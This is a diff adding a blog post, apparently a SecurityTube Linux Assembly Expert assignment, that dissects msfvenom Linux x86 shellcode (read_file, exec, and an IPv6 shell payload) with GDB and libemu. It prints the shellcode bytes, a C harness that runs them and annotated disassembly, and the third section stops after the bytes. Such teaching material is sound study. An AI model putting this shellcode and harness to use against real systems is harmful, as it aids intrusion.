@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><!--><html class="no-js">
+<!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> <title>SLAE Assignment 5 - msfvenom Shellcode Analysis – popped.io</title> <meta name="description" content="A collection of my security research, random projects and attempts to amuse."> <meta name="keywords" content="SLAE, SecurityTube, Assignment, Shellcode, nasm, assembly, msfvenom"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/me.png"> <meta name="twitter:title" content="SLAE Assignment 5 - msfvenom Shellcode Analysis"> <meta name="twitter:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta name="twitter:site" content="@skawasec"> <meta name="twitter:creator" content="@skawasec"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="SLAE Assignment 5 - msfvenom Shellcode Analysis"> <meta property="og:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta property="og:url" content="http://localhost:4000/SLAE-Assignment-5/"> <meta property="og:site_name" content="popped.io"> <meta property="og:image" content="http://localhost:4000/assets/img/me.png"> <link rel="canonical" href="http://localhost:4000/SLAE-Assignment-5/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="popped.io Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png"> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico"> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/me.png" alt="popped.io photo" class="author-photo"> <h4>popped.io</h4> <p>A collection of my security research, random projects and attempts to amuse.</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="http://twitter.com/skawasec" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://linkedin.com/in/sanjivkawa" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a> </li> <li> <a href="http://github.com/skahwah" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul>
+<!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> <li><a href="http://localhost:4000/projects/">Projects</a></li> </ul>
+<!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>SLAE Assignment 5 - msfvenom Shellcode Analysis</h1> <h4>07 Dec 2016</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~8 minutes </p>
+<!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <h3 id="slae-assignment-stub">SLAE Assignment Stub</h3> <p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.</p> <p><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p> <p>Student ID: SLAE-807</p> <h3 id="assignment-5-requirements">Assignment 5 Requirements</h3> <ul> <li>Take 3 shellcode samples created with msfvenom for Linux x86.</li> <li>Use GDB, Ndiasm and Libemu to dissect the functionality of the shellcode.</li> <li>Present your analysis of the shellcode.</li> </ul> <h3 id="msfvenom-shellcode">msfvenom Shellcode</h3> <p>The following shellcodes and corresponding debugging methods have been selected:</p> <p>1. <code class="highlighter-rouge">linux/x86/shell/read_file</code> - GDB <br> 2. <code class="highlighter-rouge">linux/x86/exec</code> - Libemu <br> 3. <code class="highlighter-rouge">linux/x86/shell/reverse_ipv6_tcp</code> - Ndiasm <br></p> <h3 id="readfile-payload-creation">1. read_file Payload Creation</h3> <p>Creating a payload for <code class="highlighter-rouge">linux/x86/shell/read_file</code> in C format.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment5$ msfvenom -p linux/x86/read_file PATH=/home/skawa/Desktop/code/assignment/assignment5/testFile.txt -f c -a x86 --platform linux
+No encoder or badchars specified, outputting raw payload
+Payload size: 122 bytes
+Final size of c file: 539 bytes
+unsigned char buf[] =
+"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
+"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
+"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
+"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
+"\xff\x2f\x68\x6f\x6d\x65\x2f\x73\x6b\x61\x77\x61\x2f\x44\x65"
+"\x73\x6b\x74\x6f\x70\x2f\x63\x6f\x64\x65\x2f\x61\x73\x73\x69"
+"\x67\x6e\x6d\x65\x6e\x74\x2f\x61\x73\x73\x69\x67\x6e\x6d\x65"
+"\x6e\x74\x35\x2f\x74\x65\x73\x74\x46\x69\x6c\x65\x2e\x74\x78"
+"\x74\x00";
+skawa@ubuntu:~/Desktop/code/assignment/assignment5$
+</code></pre></div> <p>The contents of <code class="highlighter-rouge">testFile.txt</code> are:</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment5$ cat testFile.txt
+Hi SecurityTube
+skawa@ubuntu:~/Desktop/code/assignment/assignment5$
+</code></pre></div> <h4 id="gdb-disassembly">GDB Disassembly</h4> <p>The first thing to do is create an executable binary so that the program can be compiled then attached and debugged in GDB.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment5$ cat read-file-shellcode.c
+#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+unsigned char code[] = \
+"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
+"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
+"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
+"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
+"\xff\x2f\x68\x6f\x6d\x65\x2f\x73\x6b\x61\x77\x61\x2f\x44\x65"
+"\x73\x6b\x74\x6f\x70\x2f\x63\x6f\x64\x65\x2f\x61\x73\x73\x69"
+"\x67\x6e\x6d\x65\x6e\x74\x2f\x61\x73\x73\x69\x67\x6e\x6d\x65"
+"\x6e\x74\x35\x2f\x74\x65\x73\x74\x46\x69\x6c\x65\x2e\x74\x78"
+"\x74\x00";
+
+main()
+{
+  printf("Shellcode Length: %d\n", strlen(code));
+
+  int (*ret)() = (int(*)())code;
+  ret();
+}
+skawa@ubuntu:~/Desktop/code/assignment/assignment5$ ./c-compile.sh read-file-shellcode
+[+] Compiling Shellcode
+[+] Done!
+skawa@ubuntu:~/Desktop/code/assignment/assignment5$
+</code></pre></div> <p>Next, a break point can be set on the <code class="highlighter-rouge">code</code> variable as this is where the shellcode for the <code class="highlighter-rouge">read_file</code> payload begins.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment5</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">read</span><span class="o">-</span><span class="n">file</span><span class="o">-</span><span class="n">shellcode</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment5</span><span class="o">/</span><span class="n">read</span><span class="o">-</span><span class="n">file</span><span class="o">-</span><span class="n">shellcode</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="o">*&amp;</span><span class="n">code</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x804a040</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment5</span><span class="o">/</span><span class="n">read</span><span class="o">-</span><span class="n">file</span><span class="o">-</span><span class="n">shellcode</span>
+<span class="n">Shellcode</span> <span class="n">Length</span><span class="o">:</span> <span class="mi">4</span>
+
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0804a040</span> <span class="k">in</span> <span class="n">code</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">code</span><span class="o">:</span>
+<span class="o">=&gt;</span> <span class="mh">0x0804a040</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="mh">0x804a078</span> <span class="o">&lt;</span><span class="n">code</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;</span>
+   <span class="mh">0x0804a042</span> <span class="o">&lt;+</span><span class="mi">2</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x5</span>
+   <span class="mh">0x0804a047</span> <span class="o">&lt;+</span><span class="mi">7</span><span class="o">&gt;:</span>	<span class="k">pop</span>    <span class="n">ebx</span>
+   <span class="mh">0x0804a048</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
+   <span class="mh">0x0804a04a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
+   <span class="mh">0x0804a04c</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>
+   <span class="mh">0x0804a04e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x3</span>
+   <span class="mh">0x0804a053</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">esp</span>
+   <span class="mh">0x0804a055</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">edi</span>
+   <span class="mh">0x0804a057</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x1000</span>
+   <span class="mh">0x0804a05c</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
+   <span class="mh">0x0804a05e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
+   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>
+   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">37</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="mh">0x1</span>
+   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
+   <span class="mh">0x0804a06c</span> <span class="o">&lt;+</span><span class="mi">44</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x1</span>
+   <span class="mh">0x0804a071</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="mh">0x0</span>
+   <span class="mh">0x0804a076</span> <span class="o">&lt;+</span><span class="mi">54</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
+   <span class="mh">0x0804a078</span> <span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x804a042</span> <span class="o">&lt;</span><span class="n">code</span><span class="o">+</span><span class="mi">2</span><span class="o">&gt;</span>
+   <span class="mh">0x0804a07d</span> <span class="o">&lt;+</span><span class="mi">61</span><span class="o">&gt;:</span>	<span class="k">das</span>    
+   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">62</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x2f656d6f</span>
+   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">67</span><span class="o">&gt;:</span>	<span class="k">jae</span>    <span class="mh">0x804a0f0</span>
+   <span class="mh">0x0804a085</span> <span class="o">&lt;+</span><span class="mi">69</span><span class="o">&gt;:</span>	<span class="k">popa</span>   
+   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;:</span>	<span class="k">ja</span>     <span class="mh">0x804a0e9</span>
+   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">72</span><span class="o">&gt;:</span>	<span class="k">das</span>    
+   <span class="mh">0x0804a089</span> <span class="o">&lt;+</span><span class="mi">73</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">esp</span>
+   <span class="mh">0x0804a08a</span> <span class="o">&lt;+</span><span class="mi">74</span><span class="o">&gt;:</span>	<span class="n">gs</span>
+   <span class="mh">0x0804a08b</span> <span class="o">&lt;+</span><span class="mi">75</span><span class="o">&gt;:</span>	<span class="k">jae</span>    <span class="mh">0x804a0f8</span>
+   <span class="mh">0x0804a08d</span> <span class="o">&lt;+</span><span class="mi">77</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a0fe</span>
+   <span class="mh">0x0804a08f</span> <span class="o">&lt;+</span><span class="mi">79</span><span class="o">&gt;:</span>	<span class="k">jo</span>     <span class="mh">0x804a0c0</span> <span class="o">&lt;</span><span class="n">dtor_idx</span><span class="p">.</span><span class="mi">6161</span><span class="o">&gt;</span>
+   <span class="mh">0x0804a091</span> <span class="o">&lt;+</span><span class="mi">81</span><span class="o">&gt;:</span>	<span class="k">arpl</span>   <span class="n">WORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">edi</span><span class="o">+</span><span class="mh">0x64</span><span class="err">]</span><span class="p">,</span><span class="n">bp</span>
+   <span class="mh">0x0804a094</span> <span class="o">&lt;+</span><span class="mi">84</span><span class="o">&gt;:</span>	<span class="n">gs</span>
+   <span class="mh">0x0804a095</span> <span class="o">&lt;+</span><span class="mi">85</span><span class="o">&gt;:</span>	<span class="k">das</span>    
+   <span class="mh">0x0804a096</span> <span class="o">&lt;+</span><span class="mi">86</span><span class="o">&gt;:</span>	<span class="k">popa</span>   
+   <span class="mh">0x0804a097</span> <span class="o">&lt;+</span><span class="mi">87</span><span class="o">&gt;:</span>	<span class="k">jae</span>    <span class="mh">0x804a10c</span>
+   <span class="mh">0x0804a099</span> <span class="o">&lt;+</span><span class="mi">89</span><span class="o">&gt;:</span>	<span class="k">imul</span>   <span class="n">esp</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">edi</span><span class="o">+</span><span class="mh">0x6e</span><span class="err">]</span><span class="p">,</span><span class="mh">0x746e656d</span>
+   <span class="mh">0x0804a0a0</span> <span class="o">&lt;+</span><span class="mi">96</span><span class="o">&gt;:</span>	<span class="k">das</span>    
+   <span class="mh">0x0804a0a1</span> <span class="o">&lt;+</span><span class="mi">97</span><span class="o">&gt;:</span>	<span class="k">popa</span>   
+   <span class="mh">0x0804a0a2</span> <span class="o">&lt;+</span><span class="mi">98</span><span class="o">&gt;:</span>	<span class="k">jae</span>    <span class="mh">0x804a117</span>
+   <span class="mh">0x0804a0a4</span> <span class="o">&lt;+</span><span class="mi">100</span><span class="o">&gt;:</span>	<span class="k">imul</span>   <span class="n">esp</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">edi</span><span class="o">+</span><span class="mh">0x6e</span><span class="err">]</span><span class="p">,</span><span class="mh">0x746e656d</span>
+   <span class="mh">0x0804a0ab</span> <span class="o">&lt;+</span><span class="mi">107</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x7365742f</span>
+   <span class="mh">0x0804a0b0</span> <span class="o">&lt;+</span><span class="mi">112</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a0f8</span>
+   <span class="mh">0x0804a0b2</span> <span class="o">&lt;+</span><span class="mi">114</span><span class="o">&gt;:</span>	<span class="k">imul</span>   <span class="n">ebp</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">eiz</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mh">0x2e</span><span class="err">]</span><span class="p">,</span><span class="mh">0x747874</span>
+   <span class="mh">0x0804a0ba</span> <span class="o">&lt;+</span><span class="mi">122</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
+</code></pre></div> <h4 id="jmp-call-pop">JMP CALL pop</h4> <p>The first instruction jumps to a procedure located at <code class="highlighter-rouge">0x804a078</code>. This procedure then performs a <code class="highlighter-rouge">call</code> instruction to a procedure located at the second instruction. Right after the <code class="highlighter-rouge">call</code> instruction is made, the address of the next instruction <code class="highlighter-rouge">0x0804a07d</code> is placed on the stack. This contains the location of the file which is going to be read <code class="highlighter-rouge">"/home/skawa/Desktop/code/assignment/assignment5/testFile.txt"</code></p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">bx</span> <span class="err">$</span><span class="n">esp</span>
+<span class="mh">0xbffff628</span><span class="o">:</span>	<span class="mh">0x7d</span>	<span class="mh">0xa0</span>	<span class="mh">0x04</span>	<span class="mh">0x08</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">s</span> <span class="mh">0x0804a07d</span>
+<span class="mh">0x804a07d</span> <span class="o">&lt;</span><span class="n">code</span><span class="o">+</span><span class="mi">61</span><span class="o">&gt;:</span>	 <span class="s">"/home/skawa/Desktop/code/assignment/assignment5/testFile.txt"</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
+</code></pre></div> <h4 id="interrupt-1---open">Interrupt 1 - Open</h4> <p>The first chunk of instructions are responsible for opening the file.</p> <div class="highlighter-rouge"><pre class="highlight"><code>mov eax,0x5     ;open system call, 5
+pop ebx         ;pop the location of the file, 0x0804a07d, into EBX
+xor ecx,ecx     ;zero out ecx
+0x80            ;execute open
+</code></pre></div> <h4 id="interrupt-2---read">Interrupt 2 - Read</h4> <p>The second chunk of instructions are responsible for reading the file.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>     <span class="c">;arg 1, the file descriptor that is return by the open syscall</span>
+<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span><span class="mh">0x3</span>     <span class="c">;read system call, 3</span>
+<span class="k">mov</span> <span class="n">edi</span><span class="p">,</span><span class="n">esp</span>     <span class="c">;preserve the stack pointer in EDI</span>
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">edi</span>     <span class="c">;arg 2, ECX points to the stack</span>
+<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span><span class="mh">0x1000</span>  <span class="c">;set 4096 bytes to read</span>
+<span class="k">int</span> <span class="mh">0x80</span>        <span class="c">;execute read system call</span>
+</code></pre></div> <h4 id="interrupt-3---write">Interrupt 3 - Write</h4> <p>The third chunk of instructions are responsible for writing the contents of the file to screen.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">mov</span> <span class="n">edx</span><span class="p">,</span><span class="n">eax</span>  <span class="c">;arg 3, the file descriptor that is return by the read syscall</span>
+<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>  <span class="c">;write system call, 4</span>
+<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="mh">0x1</span>  <span class="c">;arg 2, write to STDIN (screen)</span>
+<span class="k">int</span> <span class="mh">0x80</span>     <span class="c">;execute write system call</span>
+</code></pre></div> <h4 id="interrupt-4---exit">Interrupt 4 - Exit</h4> <p>The last chunk of instructions are responsible for exiting the program</p> <div class="highlighter-rouge"><pre class="highlight"><code>mov eax,0x1 ;exit
+mov ebx,0x0 ;arg 1, value 0
+int 0x80    ;execute exit system call
+</code></pre></div> <h3 id="exec-payload-creation">2. exec Payload Creation</h3> <p>Libemu is a fantastic emulator that can help with running and disassembling shellcode in to meaningful segments and instructions.</p> <p>The example shellcode below is the <code class="highlighter-rouge">linux/x86/exec</code> payload part of <code class="highlighter-rouge">msfvenom</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/libemu/tools/sctest$ msfvenom -p linux/x86/exec CMD=ifconfig -f raw -a x86 --platform linux | ./sctest -vvv -S -s 100000
+verbose = 3
+No encoder or badchars specified, outputting raw payload
+Payload size: 44 bytes
+
+&lt;snippet&gt;
+
+int execve (
+     const char * dateiname = 0x00416fc0 =&gt;
+           = "/bin/sh";
+     const char * argv[] = [
+           = 0x00416fb0 =&gt;
+               = 0x00416fc0 =&gt;
+                   = "/bin/sh";
+           = 0x00416fb4 =&gt;
+               = 0x00416fc8 =&gt;
+                   = "-c";
+           = 0x00416fb8 =&gt;
+               = 0x0041701d =&gt;
+                   = "ifconfig";
+           = 0x00000000 =&gt;
+             none;
+     ];
+     const char * envp[] = 0x00000000 =&gt;
+         none;
+) =  0;
+skawa@ubuntu:~/libemu/tools/sctest$
+</code></pre></div> <p>In addition to displaying the code above, libemu is also able to create a graphical representation of all instructions and system interrupts that exist in the emulated program.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/libemu/tools/sctest$ msfvenom -p linux/x86/exec CMD=ifconfig -f raw -a x86 --platform linux | ./sctest -vvv -S -s 100000 -G execve.dot
+skawa@ubuntu:~/libemu/tools/sctest$dot execve.dot -T png -o execve.png
+skawa@ubuntu:~/libemu/tools/sctest$
+</code></pre></div> <p><img src="https://github.com/skahwah/skahwah.github.io/blob/master/_data/slae-assignment-5.png?raw=true"></p> <h4 id="dissecting-the-instructions">Dissecting the Instructions</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">push</span> <span class="n">byte</span> <span class="mh">0xb</span>         <span class="c">;push 11 on to the stack</span>
+<span class="k">pop</span> <span class="n">eax</span>               <span class="c">;execve syscall, 11</span>
+<span class="k">cwd</span>
+<span class="k">push</span> <span class="n">edx</span>              <span class="c">;push null terminator on to the stack</span>
+<span class="k">push</span> <span class="n">word</span> <span class="mh">0x632d</span>      <span class="c">;push -c</span>
+<span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">esp</span>          <span class="c">;preserve stack pointer in EDI</span>
+<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x68732f</span>   <span class="c">;next two instructions push /bin/sh</span>
+<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x6e69622f</span>
+<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>          <span class="c">;move stack pointer in ESP</span>
+<span class="k">push</span> <span class="n">edx</span>              <span class="c">;push null terminator on to the stack</span>
+<span class="k">call</span> <span class="mh">0x1</span>              <span class="c">;get the custom command, ifcondig</span>
+<span class="k">push</span> <span class="n">edi</span>              <span class="c">;stack address restored</span>
+<span class="k">push</span> <span class="n">ebx</span>              <span class="c">;filename /bin/sh</span>
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>          <span class="c">;ECX contains all arguments for execve</span>
+<span class="k">int</span> <span class="mh">0x80</span>              <span class="c">;execute execve syscall</span>
+</code></pre></div> <h3 id="reverseipv6tcp-payload-creation">3. reverse_ipv6_tcp Payload Creation</h3> <p>Creating a payload for <code class="highlighter-rouge">linux/x86/shell/reverse_ipv6_tcp</code> in C format.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/libemu/tools/sctest$ msfvenom -p linux/x86/shell/bind_ipv6_tcp LHOST=::1 -f c -a x86 --platform linux
+No encoder or badchars specified, outputting raw payload
+Payload size: 120 bytes
+Final size of c file: 528 bytes
+unsigned char buf[] =
+"\x6a\x7d\x58\x99\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\x66\x81"
+"\xe3\x00\xf0\xcd\x80\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x0a\x89"
+"\xe1\xb0\x66\xcd\x80\x51\x6a\x04\x54\x6a\x02\x6a\x01\x50\x97"
+"\x89\xe1\x6a\x0e\x5b\x6a\x66\x58\xcd\x80\x97\x83\xc4\x14\x59"
+"\x5b\x5e\x6a\x02\x5b\x52\x52\x52\x52\x52\x52\x68\x0a\x00\x11"
+"\x5c\x89\xe1\x6a\x1c\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\xd1"
+"\xe3\xb0\x66\xcd\x80\x50\x43\xb0\x66\x89\x51\x04\xcd\x80\x93"
+"\xb6\x0c\xb0\x03\xcd\x80\x87\xdf\x5b\xb0\x06\xcd\x80\xff\xe1";
+skawa@ubuntu:~/libemu/tools/sctest$
